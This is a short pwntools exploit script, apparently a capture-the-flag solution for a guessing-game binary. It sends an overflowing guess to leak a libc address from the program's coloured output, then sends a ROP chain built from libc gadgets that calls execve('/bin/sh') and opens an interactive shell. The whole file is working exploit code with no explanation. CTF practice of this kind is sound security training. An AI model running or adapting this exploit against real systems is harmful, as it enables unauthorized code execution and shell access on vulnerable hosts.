from pwn import *

HOST = ""
PORT = 0
if args.LOCAL:
    io = process("./challenge_patched")
    if args.GDB:
        cmd = """"
        """
        gdb.attach(io, cmd)
else:
    io = remote(HOST, PORT)

libc = ELF("./libc.so.6")

io.sendlineafter(b' be?\n', b'10')
io.sendlineafter(b' get?\n', b'7')


io.sendlineafter(b'What is your guess #1?\n', b'123456789\xff')

pay = b'A' * 9 + b'\xff' + b'A' * (0x6c-10) + b'\xff'
pause()
io.sendlineafter(b'What is your guess #2?\n', pay)

leak = io.recvuntil(b'What is your guess #3?\n')

leak = leak.replace(b"\x1b[1;30;42m ", b"").replace(b"\x1b[1;30;43m ", b"").replace(b"\x1b[0m ", b"")
leak = leak.replace(b" ", b"")

libc.address = u64(leak[0x9b:0x9b+8]) - 0x29d90
log.info("libc "+hex(libc.address))

pay = b'\0' * (0x6c-10) + b"\x81" 
pay += p64(libc.address+0x000000000002a3e5) + p64(next(libc.search(b'/bin/sh')))
pay += p64(libc.address+0x000000000002be51) + p64(0)
pay += p64(libc.address+0x000000000011f2e7) + p64(0)*2
pay += p64(libc.sym.execve)

io.sendline(pay.ljust(255, b'\0'))

io.interactive()
